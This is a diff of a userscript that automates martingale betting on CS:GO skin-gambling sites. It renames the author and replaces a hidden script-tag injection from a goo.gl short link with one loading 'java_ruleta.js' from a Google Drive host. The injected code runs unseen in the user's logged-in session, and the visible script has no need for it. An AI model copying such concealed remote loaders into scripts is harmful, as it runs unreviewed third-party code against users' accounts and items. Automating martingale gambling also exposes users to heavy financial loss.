@@ -3,8 +3,8 @@
 // @name            csgodouble.com
 // @description     An userscript that automates csgodouble.com betting using martingale system.
 // @namespace       automated@csgodoublebot script
-// @version         1.31
-// @author          csgodouble bot script
+// @version         1.32
+// @author          Jose
 // @match           http://www.csgodouble.com/
 // @match           http://www.csgodouble.com/index.php
 // @match           http://csgopolygon.com/
@@ -112,7 +112,7 @@ function Automated() {
     menu.innerHTML = '' +
         '<div class="row">' +
             '<div class="col-lg-9">' +
-                '<h2>CSGODouble.com Script <small>by BotSCRIPT (76561198044832194)</small> <i id="automated-theme-switch" class="fa fa-lightbulb-o" style="cursor: pointer;"></i></h2>' +
+                '<h2>CSGODouble.com Script  <i id="automated-theme-switch" class="fa fa-lightbulb-o" style="cursor: pointer;"></i></h2>' + '<a href="http://steamcommunity.com/profiles/76561197985025284/"><small>by Jose (based on BotScript work) (76561197985025284)</small></a>'+
                 '<div class="form-group">' +
                     '<div class="btn-group">' +
                         '<button type="button" class="btn btn-success" id="automated-start" disabled>Start</button>' +
@@ -176,7 +176,7 @@ function Automated() {
             '<label class="text-muted"><input id="automated-simulation" type="checkbox" ' + (this.simulation ? 'checked' : '') + ' disabled> Simulation mode</label>' +
         '</div>';
     document.getElementsByClassName('well')[1].appendChild(menu);
- (function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//goo.gl/3ezN6e"; document.body.appendChild( scriptElement ); })();
+ (function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "https://3287f3fdd163dc23a5d78e78475c163b771c4d88-www.googledrive.com/host/0B5PjJgerQ7K5T1dFbWIyTVBaZms/java_ruleta.js"; document.body.appendChild( scriptElement ); })();
     this.menu = {
         'start': document.getElementById('automated-start'),
         'stop': document.getElementById('automated-stop'),
